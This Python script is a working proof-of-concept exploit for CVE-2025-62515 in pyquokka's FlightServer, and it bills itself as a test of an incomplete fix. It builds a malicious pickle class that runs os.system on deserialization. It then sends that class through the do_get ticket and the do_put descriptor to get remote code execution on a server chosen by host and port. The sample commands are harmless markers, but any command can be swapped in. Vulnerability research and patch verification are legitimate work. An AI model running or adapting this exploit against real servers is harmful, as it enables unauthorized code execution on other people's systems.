#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : pyquokka FlightServer — Incomplete Fix Bypass (do_get/do_put)
# CVE            : CVE-2025-62515
# Vendor         : marsupialtail (pyquokka)
# Product        : pyquokka FlightServer
# Affected       : All versions through 0.3.2 (UNPATCHED)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-62515 — Fix Bypass via Alternative pickle.loads() Sinks

The simulated fix replaces pickle.loads() with json.loads() in do_action()
only (set_configs at line 283, cache_garbage_collect at line 305). However,
TWO OTHER methods remain unpatched:

  1. do_get() at line 98:  pickle.loads(ticket.ticket)
  2. do_put() at line 46:  pickle.loads(key[1])

This bypass uses DIFFERENT protocol operations (do_get/do_put vs do_action)
and DIFFERENT data carriers (Flight Ticket / descriptor vs Action body).

ATTACK CHAIN:
  1. Verify original vectors (set_configs, cache_garbage_collect) are blocked
  2. Bypass via do_get(Ticket(<pickle_payload>)) — line 98
  3. Bypass via do_put(descriptor=<pickle_in_command>) — line 46

PREREQUISITES:
  - pyarrow (client-side only): pip install pyarrow
  - Patched container running (docker-compose-bypass.yml)

REFERENCES:
  - CVE-2025-62515
  - https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p
"""

import sys
import pickle
import os
import subprocess

import pyarrow
import pyarrow.flight


# === Bypass Payload ===
# Same RCE primitive (pickle __reduce__), but delivered through
# a completely different protocol path (do_get instead of do_action)

class RCEPayload:
    """
    Malicious pickle class that executes an OS command when deserialized.
    When pickle.loads() encounters this object, it calls __reduce__(),
    which returns (os.system, (<command>,)). The pickle module then
    invokes os.system(<command>) to reconstruct the object — achieving RCE.
    """
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))


def test_set_configs_blocked(client, target_uri):
    """Verify that the original set_configs vector is blocked by the fix."""
    print("[*] Step 1: Verify original vector (set_configs) is BLOCKED by fix...")

    payload = RCEPayload("touch /tmp/bypass-test-setconfigs")
    malicious_bytes = pickle.dumps(payload)
    action = pyarrow.flight.Action("set_configs", malicious_bytes)

    try:
        results = list(client.do_action(action))
        print("[-] WARNING: set_configs accepted pickle data — fix may not be applied!")
        return False
    except pyarrow.flight.FlightServerError as e:
        error_msg = str(e)
        if "json" in error_msg.lower() or "utf-8" in error_msg.lower() or "decode" in error_msg.lower():
            print("[+] set_configs correctly rejects pickle data (json.loads fix working)")
            print(f"    Error: {error_msg[:150]}...")
            return True
        elif "'int' object is not iterable" in error_msg:
            print("[-] WARNING: set_configs executed pickle payload — FIX NOT APPLIED!")
            return False
        else:
            print(f"[?] Unexpected error: {error_msg[:150]}...")
            return True  # Conservatively assume fix is working
    except Exception as e:
        print(f"[?] Connection error: {e}")
        return True


def test_cache_gc_blocked(client, target_uri):
    """Verify that the cache_garbage_collect vector is also blocked."""
    print("[*] Step 2: Verify secondary vector (cache_garbage_collect) is BLOCKED...")

    payload = RCEPayload("touch /tmp/bypass-test-cachegc")
    malicious_bytes = pickle.dumps(payload)
    action = pyarrow.flight.Action("cache_garbage_collect", malicious_bytes)

    try:
        results = list(client.do_action(action))
        print("[-] WARNING: cache_garbage_collect accepted pickle data!")
        return False
    except pyarrow.flight.FlightServerError as e:
        error_msg = str(e)
        if "json" in error_msg.lower() or "utf-8" in error_msg.lower() or "decode" in error_msg.lower():
            print("[+] cache_garbage_collect correctly rejects pickle data (json.loads fix working)")
            return True
        elif "'int' object is not iterable" in error_msg:
            print("[-] WARNING: cache_garbage_collect executed pickle — FIX NOT APPLIED!")
            return False
        else:
            print(f"[?] Unexpected error: {error_msg[:150]}...")
            return True
    except Exception as e:
        print(f"[?] Connection error: {e}")
        return True


def bypass_via_do_get(client, target_uri, marker_suffix="bypass"):
    """
    BYPASS: Exploit the UNPATCHED do_get() method.

    The do_get() method at line 98 calls:
        pickle.loads(ticket.ticket)

    This is in a completely DIFFERENT method from do_action() and uses a
    different protocol operation (FlightClient.do_get vs FlightClient.do_action).
    The fix that patches do_action() does NOT touch do_get().

    The malicious pickle payload is sent as the Flight Ticket bytes.
    """
    print()
    print("[*] Step 3: BYPASS — Exploiting UNPATCHED do_get() method (line 98)")
    print("[*] Technique: pickle.loads(ticket.ticket) — different method, different protocol op")

    marker_file = f"/tmp/cve-2025-62515-{marker_suffix}"
    rce_command = (
        f"id > {marker_file} && "
        f"echo '---' >> {marker_file} && "
        f"hostname >> {marker_file} && "
        f"echo '---' >> {marker_file} && "
        f"echo 'BYPASS: RCE via do_get ticket deserialization (line 98)' >> {marker_file} && "
        f"echo 'Fix only patched do_action() — do_get() still uses pickle.loads()' >> {marker_file}"
    )

    payload = RCEPayload(rce_command)
    malicious_bytes = pickle.dumps(payload)
    ticket = pyarrow.flight.Ticket(malicious_bytes)

    print(f"[+] Crafted bypass pickle payload ({len(malicious_bytes)} bytes)")
    print(f"[+] Delivery: FlightClient.do_get(Ticket(<pickle_payload>))")
    print(f"[+] Target sink: pickle.loads(ticket.ticket) at flight.py line 98")
    print()

    print(f"[+] Sending malicious do_get request...")
    try:
        reader = client.do_get(ticket)
        # Try to read results (unlikely to succeed, but just in case)
        for chunk in reader:
            pass
        print("[?] do_get returned data (unexpected)")
    except pyarrow.flight.FlightServerError as e:
        error_msg = str(e)
        if "cannot unpack" in error_msg or "not iterable" in error_msg:
            # This error means pickle.loads() ran our __reduce__() method,
            # which returned an int (from os.system()). The server then tried
            # to unpack the int as a 6-tuple, causing a ValueError.
            # RCE has ALREADY executed at this point.
            print(f"[+] Server error (EXPECTED — RCE already executed during pickle.loads()):")
            print(f"    {error_msg[:180]}...")
            return marker_file, True
        else:
            print(f"[-] Unexpected server error: {error_msg[:200]}...")
            return marker_file, False
    except Exception as e:
        print(f"[-] Error: {e}")
        return marker_file, False

    return marker_file, False


def bypass_via_do_put(client, target_uri, marker_suffix="bypass-doput"):
    """
    BYPASS: Exploit the UNPATCHED do_put() method.

    The do_put() method at line 46 calls:
        pickle.loads(key[1])

    where key[1] is the descriptor.command bytes from the Flight descriptor.
    This is yet another UNPATCHED pickle.loads() sink.
    """
    print()
    print("[*] Step 4: BYPASS — Exploiting UNPATCHED do_put() method (line 46)")
    print("[*] Technique: pickle.loads(descriptor.command) — yet another unpatched method")

    marker_file = f"/tmp/cve-2025-62515-{marker_suffix}"
    rce_command = (
        f"id > {marker_file} && "
        f"echo '---' >> {marker_file} && "
        f"hostname >> {marker_file} && "
        f"echo '---' >> {marker_file} && "
        f"echo 'BYPASS: RCE via do_put descriptor deserialization (line 46)' >> {marker_file} && "
        f"echo 'Fix only patched do_action() — do_put() still uses pickle.loads()' >> {marker_file}"
    )

    payload = RCEPayload(rce_command)
    malicious_bytes = pickle.dumps(payload)

    # Create a Flight descriptor with the pickle payload in the command field
    descriptor = pyarrow.flight.FlightDescriptor.for_command(malicious_bytes)

    # We need to send a valid RecordBatch for do_put to work through the protocol
    # The schema doesn't matter — RCE fires during pickle.loads() of the descriptor
    schema = pyarrow.schema([("dummy", pyarrow.int32())])
    batch = pyarrow.record_batch([pyarrow.array([1])], schema=schema)

    print(f"[+] Crafted bypass pickle payload in descriptor ({len(malicious_bytes)} bytes)")
    print(f"[+] Delivery: FlightClient.do_put(descriptor=<pickle_in_command>, data)")
    print(f"[+] Target sink: pickle.loads(key[1]) at flight.py line 46")
    print()

    print(f"[+] Sending malicious do_put request...")
    try:
        writer, reader = client.do_put(descriptor, schema)
        writer.write_batch(batch)
        writer.close()
        print("[?] do_put completed without error")
        return marker_file, True
    except pyarrow.flight.FlightServerError as e:
        error_msg = str(e)
        if "cannot unpack" in error_msg or "not iterable" in error_msg or "not enough values" in error_msg:
            print(f"[+] Server error (EXPECTED — RCE already executed during pickle.loads()):")
            print(f"    {error_msg[:180]}...")
            return marker_file, True
        else:
            print(f"[-] Server error: {error_msg[:200]}...")
            # RCE may still have executed even with unexpected errors
            return marker_file, None  # Unknown — check marker file
    except Exception as e:
        print(f"[-] Error: {e}")
        return marker_file, None


def main():
    target_host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 5005
    target_uri = f"grpc://{target_host}:{target_port}"

    print("=" * 72)
    print("CVE-2025-62515 — FIX BYPASS PoC")
    print("Bypass via alternative pickle.loads() sinks in unpatched methods")
    print("=" * 72)
    print()
    print(f"[*] Target: {target_uri}")
    print()

    # Connect to the FlightServer
    print(f"[+] Connecting to FlightServer...")
    try:
        client = pyarrow.flight.connect(target_uri)
        actions = list(client.list_actions())
        action_names = [a.type for a in actions]
        print(f"[+] Connected! Available actions: {action_names}")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)

    if "cache_garbage_collect" not in action_names:
        print("[-] Does not appear to be a pyquokka FlightServer")
        sys.exit(1)
    print()

    # === Phase 1: Confirm the fix blocks original vectors ===
    fix_blocks_setconfigs = test_set_configs_blocked(client, target_uri)
    fix_blocks_cachegc = test_cache_gc_blocked(client, target_uri)

    if not fix_blocks_setconfigs and not fix_blocks_cachegc:
        print()
        print("[!] WARNING: The fix does not appear to be applied.")
        print("[!] The server is vulnerable to the ORIGINAL PoC vectors.")
        print("[!] A bypass test is still meaningful to demonstrate alternative paths.")

    # === Phase 2: Bypass via do_get ===
    marker_doget, doget_success = bypass_via_do_get(client, target_uri)

    # === Phase 3: Bypass via do_put ===
    marker_doput, doput_success = bypass_via_do_put(client, target_uri)

    # === Results Summary ===
    print()
    print("=" * 72)
    print("RESULTS SUMMARY")
    print("=" * 72)
    print()
    print(f"  Original vector (set_configs):       {'BLOCKED ✓' if fix_blocks_setconfigs else 'VULNERABLE ✗'}")
    print(f"  Original vector (cache_garbage_collect): {'BLOCKED ✓' if fix_blocks_cachegc else 'VULNERABLE ✗'}")
    print(f"  Bypass via do_get (line 98):         {'RCE ACHIEVED ✗' if doget_success else 'BLOCKED ✓' if doget_success is False else 'UNKNOWN (check marker)'}")
    print(f"  Bypass via do_put (line 46):         {'RCE ACHIEVED ✗' if doput_success else 'BLOCKED ✓' if doput_success is False else 'UNKNOWN (check marker)'}")
    print()

    if doget_success or doput_success:
        print("[!] *** FIX BYPASS SUCCESSFUL ***")
        print("[!] The partial fix only patches do_action() but leaves do_get() and do_put()")
        print("[!] with identical pickle.loads() sinks that achieve the same RCE.")
        print()
        print("[*] Verify RCE on the PATCHED container:")
        if doget_success:
            print(f"    docker exec <container> cat {marker_doget}")
        if doput_success:
            print(f"    docker exec <container> cat {marker_doput}")
    else:
        print("[+] Fix appears comprehensive — no bypass found via alternative paths.")

    print()


if __name__ == "__main__":
    main()
